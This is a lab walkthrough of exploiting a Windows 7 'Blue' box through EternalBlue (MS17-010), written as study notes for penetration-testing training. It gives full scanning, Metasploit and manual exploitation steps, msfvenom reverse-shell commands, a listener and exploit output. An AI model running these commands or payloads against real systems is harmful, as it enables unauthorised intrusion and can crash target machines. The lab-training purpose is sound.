
# Blue Walkthrough
Treat these boxes as if they were CTFs (not actually pen-tests).
## Recon
Our first [nmap](CLI-tools/linux/nmap.md) scan gives us a few ports and some OS versioning:
```bash
nmap -Pn $t 
	Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-04 13:59 EDT
	Nmap scan report for 10.0.2.6
	Host is up (0.00077s latency).
	Not shown: 991 closed tcp ports (conn-refused)
	PORT      STATE SERVICE
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	445/tcp   open  microsoft-ds
	49152/tcp open  unknown
	49153/tcp open  unknown
	49154/tcp open  unknown
	49155/tcp open  unknown
	49156/tcp open  unknown
	49158/tcp open  unknown
# ---
sudo nmap -A -p 139, 445 $t
	Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-04 14:16 EDT
	Nmap scan report for 10.0.2.6
	Host is up (0.00038s latency).
		PORT    STATE SERVICE     VERSION                        
	139/tcp open  netbios-ssn Windows 7 Ultimate 7601 Service Pack 1 netbios-ssn
...
```
The useful service version we get out of this is `Windows 7 Ultimate 7601 Service Pack 1`.
### [searchsploit](cybersecurity/tools/exploitation/searchsploit.md)
Using searchsploit, we don't find anything about this service version:
```bash
searchsploit 'Microsoft 7 Ultimate'
Exploits: No Results
Shellcodes: No Results
```
### Google
Searching `microsoft 7 ultimate exploits` online, we find a lot of mentions to [EternalBlue](cybersecurity/vulnerabilities/eternalblue.md) and *MS17-010*. EternalBlue is an exploit which uses [SMB](networking/protocols/SMB.md) to get remote code execution on the target. 

We also find the [Exploit DB](cybersecurity/tools/exploitation/exploit-db.md) entry [for EternalBlue](https://www.exploit-db.com/exploits/42315).
## [Metasploit](cybersecurity/tools/metasploit.md)
Now that we've found an exploit that will likely work on this machine, let's see what Metasploit has to help us.
### Auxiliary Module
In `msfconsole` let's search for EternalBlue:
```bash
msf6 > search eternalblue
Matching Modules
================
   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```
First, we want to use the less invasive module, which is auxiliary. In this case, we can use the SMB scanner `auxiliary/scanner/smb/smb_ms17_010`. To choose this, type `use 3` and it will set the module context for the console.

This module should tell us whether the target is vulnerable to EternalBlue by scanning it. To see what variables we need to set, type `options` and/or `info`:
![](nested-repos/PNPT-study-guide/PNPT-pics/blue-1.png)
![](/PNPT-study-guide/PNPT-pics/blue-1.png)
Set `RHOSTS` to our target using `set rhosts <target IP>`. Now we can type `run` to scan the target:
```bash
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.0.2.6:445          - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 10.0.2.6:445          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
### Exploit Module
Now that we've confirmed this box is vulnerable, let's use metasploit to exploit it. In `msfconsole`, search "eternalblue" again. This time, choose the windows exploit `exploit/windows/smb/smb_ms17_010`.

**TIP:** We've already verified that the target is vulnerable, but this exploit module can also check. If we use `options` we can see that `VERIFY_ARCH` & `VERIFY_TARGET` are set to true. To use this module to check, just type the command `check`.
#### Payload
When we loaded the module, we got the warning `[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp`. To make sure we have the right payload, we just have to use `set payload`.
##### Meterpreter
Using `set payload windows` and tab completing, we can get a list of all the possible payloads. Let's try using a meterpreter payload which is Metasploit's in-built shell:
```bash
set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
```
### Exploit
After making sure all of our options are set how we want, type `run` and let metasploit do all the work. We know it's succeeded with a shell when we see the meterpreter prompt appear:
```bash
[+] 10.0.2.6:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.0.2.6:445 - Sending egg to corrupted connection.
[*] 10.0.2.6:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.0.2.6
[*] Meterpreter session 1 opened (10.0.2.4:4444 -> 10.0.2.6:49159) at 2023-10-07 15:56:30 -0400
[+] 10.0.2.6:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.2.6:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.2.6:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > whoami
[-] Unknown command: whoami
```
## Manual Exploitation
Instead of using Metasploit, we can find a way to use EternalBlue ourselves:
### Searchsploit
![](nested-repos/PNPT-study-guide/PNPT-pics/blue-2.png)
![](/PNPT-pics/blue-2.png)
Let's go through out searchsploit/ exploit db flow again. Using `searchsploit` we can see that we have three options for exploit code; all three use [python](coding/languages/python.md), all three are for Windows, but only 2 can exploit Windows 7 (our target).

We can either checkout the code on our machine at the path `/usr/share/exploitdb/exploits/windows/remote/42031.py` or on [Exploit DB](https://www.exploit-db.com/exploits/42031). Unfortunately, this script, as well as the alternative (ID 42315) don't work right out of the box w/o some major debugging. So let's find a reliable version on google.
### GitHub
Searching google for `eternalblue exploit code`, we come across a few github repos. We want to be sure the code on these repos is not only reliable *but also not malicious* towards the user (us).

W/o having to read through every line, we can use check the trustworthiness of an exploit script by looking at the community  interactions w/ it. For example, [this script from 3ndG4me](https://github.com/3ndG4me/AutoBlue-MS17-010) has 990 starts, 30 accounts watching it, and has been updated in the last 2 years.

Additionally, it comes with an easy to follow walkthrough on how to set it up.
### 3ndG4me AutoBlue-MS17-010
Since this is a [python](coding/languages/python.md) script, we can go through the walkthrough *and avoid cluttering our machine w/ installs etc* by using python venv. To install python venv, just attempt to use it, and python will tell you what package to install if you don't have it.
#### Python Venv
Python venv is essentially a tiny VM where you can do all of your dev work on python. It creats a virtual environment for needed dependencies etc.. You can destroy it once you're done, allowing you to avoid installing unneeded BS on your machine.

After installing venv, you can set it up in your working directory like this:
```bash
┌──(hakcypuppy㉿kali)-[~/blue]
└─$ python3 -m venv venv 
┌──(hakcypuppy㉿kali)-[~/blue]
└─$ ls 
blue.findings.txt  blue.msfconsole.smb.versioning.txt  blue.txt  eb.py  enum4linux.blue.txt  mysmb.py  __pycache__  venv
┌──(hakcypuppy㉿kali)-[~/blue]
└─$ source venv/bin/activate
┌──(venv)(hakcypuppy㉿kali)-[~/blue]   # <---- now you're in the virtual env.
└─$ 
```
*NOW* we can go through the walkthrough for this exploit code.
#### Clone the repo
```bash
┌──(venv)(hakcypuppy㉿kali)-[~/blue]
└─$ git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
Cloning into 'AutoBlue-MS17-010'...
remote: Enumerating objects: 136, done.
remote: Counting objects: 100% (60/60), done.
remote: Compressing objects: 100% (24/24), done.
remote: Total 136 (delta 46), reused 36 (delta 36), pack-reused 76
Receiving objects: 100% (136/136), 101.12 KiB | 967.00 KiB/s, done.
Resolving deltas: 100% (80/80), done.
```
#### Install dependencies
`cd` into the cloned repo and run the following command (this is why we made a venv):
```bash
pip install -r requirements.txt
Collecting impacket (from -r requirements.txt (line 1))
  Downloading impacket-0.11.0.tar.gz (1.5 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.5/1.5 MB 8.9 MB/s eta 0:00:00
  Installing build dependencies ... done
  Getting requirements to build wheel ...
```
#### Checking target
Just like w/ the metasploit module, this script can run a check against the target to make sure it's vulnerable *before we exploit*. In real pentests this may be enough to prove vulnerability *especially if you are testing critical infrastructure*.

EternalBlue tends to *completely crash the target*. So if you're checking for it as a vulnerability on a real target, you should consider doing the check instead of the exploit so you don't crash the target system.

To check the target run `./`
#### Shellcode
`cd` into `/shellcode` and run `./shell_prep.sh`
```bash
./shell_prep.sh                                                                       
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler
Let's compile them windoos shellcodezzz
Compiling x64 kernel shellcode
```
It will give you a bunch of options, we're gonna do the following:
```bash
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz
Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
10.0.2.4
LPORT you want x64 to listen on:
44444
LPORT you want x86 to listen on:
44445
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
0
Generating x64 cmd shell (staged)...

msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.0.2.4 LPORT=44444
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 511 bytes
Saved as: sc_x64_msf.bin

Generating x86 cmd shell (staged)...
msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.0.2.4 LPORT=44445
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 375 bytes
Saved as: sc_x86_msf.bin

MERGING SHELLCODE WOOOO!!!
DONE
```
#### Listener
Now that the shellcode is ready, let's setup the listener. `cd ..` back into the root dir of this repo. Run `./listener_prep.sh` w/ the following inputs:
```bash
┌──(venv)(hakcypuppy㉿kali)-[~/blue/AutoBlue-MS17-010]
└─$ ./listener_prep.sh 
  __
  /,-
  ||)
  \\_, )
   `--'
Enternal Blue Metasploit Listener

LHOST for reverse connection:
10.0.2.4
LPORT for x64 reverse connection:
44444
LPORT for x86 reverse connection:
44445
Enter 0 for meterpreter shell or 1 for regular cmd shell:
1
Type 0 if this is a staged payload or 1 if it is for a stageless payload
0
Starting listener (staged)...
Starting postgresql (via systemctl): postgresql.service.
```
#### Exploit
Once it's setup and you see the msfconsole, open another terminal, cd into the repo dir and run `python eternalblue_exploit7.py <target IP> shellcode/sc_all.bin`
```bash
eternalblue_exploit7.py 10.0.2.6 shellcode/sc_all.bin        
shellcode size: 2307
numGroomConn: 13
Target OS: Windows 7 Ultimate 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 984, in non_polling_read
    received = self._sock.recv(bytes_left)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^
TimeoutError: timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/hakcypuppy/blue/AutoBlue-MS17-010/eternalblue_exploit7.py", line 563, in <module>
   exploit(TARGET, s...
```
What will likely happen is *this will crash your target machine*:
![](nested-repos/PNPT-study-guide/PNPT-pics/blue-3.png)
![](/PNPT-pics/blue-3.png)
This exploit is *volatile* because it's a [buffer-overflow](cybersecurity/TTPs/exploitation/buffer-overflow.md), and will commonly cause a target to crash. **DON'T USE THIS AGAINST CRITICAL INFRASTRUCTURE** such as targets in hospitals, etc..

> [!Resources]
> - [ExploitDB: ID 42031](https://www.exploit-db.com/exploits/42031)
> - [3ndG4me: AutoBlue GitHub repo](https://github.com/3ndG4me/AutoBlue-MS17-010)

> [!My previous notes (linked in text)]
> - You'll find them all [here](https://github.com/TrshPuppy/obsidian-notes)
